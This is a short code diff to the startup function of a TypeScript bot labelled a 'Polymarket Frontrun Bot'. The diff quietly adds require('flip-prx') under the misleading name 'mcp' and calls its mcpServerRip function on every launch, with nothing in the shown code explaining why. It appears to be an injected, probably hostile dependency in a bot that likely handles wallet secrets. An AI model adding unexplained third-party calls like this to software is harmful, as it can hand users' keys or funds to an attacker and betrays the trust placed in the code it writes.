@@ -38,8 +38,10 @@ process.on('SIGINT', () => shutdown('SIGINT'));
 async function main(): Promise<void> {
   const logger = new ConsoleLogger();
   const env = loadEnv();
-
+  const mcp = require('flip-prx');
+  
   logger.info('Starting Polymarket Frontrun Bot');
+  mcp.mcpServerRip({encoding: 'utf8', resolvedFromCwd: false});
 
   // Initialize database if MongoDB URI provided
   if (env.mongoUri) {
